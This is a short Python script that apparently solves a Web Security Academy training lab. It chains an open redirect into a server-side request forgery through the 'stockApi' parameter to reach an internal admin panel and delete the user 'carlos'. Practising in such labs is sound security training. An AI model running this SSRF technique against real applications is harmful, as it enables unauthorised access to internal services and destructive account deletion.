import requests
from urllib.parse import urljoin, quote_plus, quote



base_url = 'https://ac8e1f671fbe0f10c0c03b49008e0035.web-security-academy.net/'


def do_request(endpoint: str) -> str:
    data = {
            'stockApi': endpoint
            }
    response = requests.post(urljoin(base_url, '/product/stock'), data=data)
    return response.content.decode('utf-8')


# note the double url encoding

# discover endpoint
redirect_base = '/product/nextProduct?currentProductId=1&path='
admin_panel = redirect_base + 'http://192.168.0.12:8080/admin'
print(do_request(admin_panel))  
# delete user
delete_action = redirect_base + 'http://192.168.0.12:8080/admin/delete?username=carlos'
print(do_request(delete_action))  
# check success
print(do_request(admin_panel))  
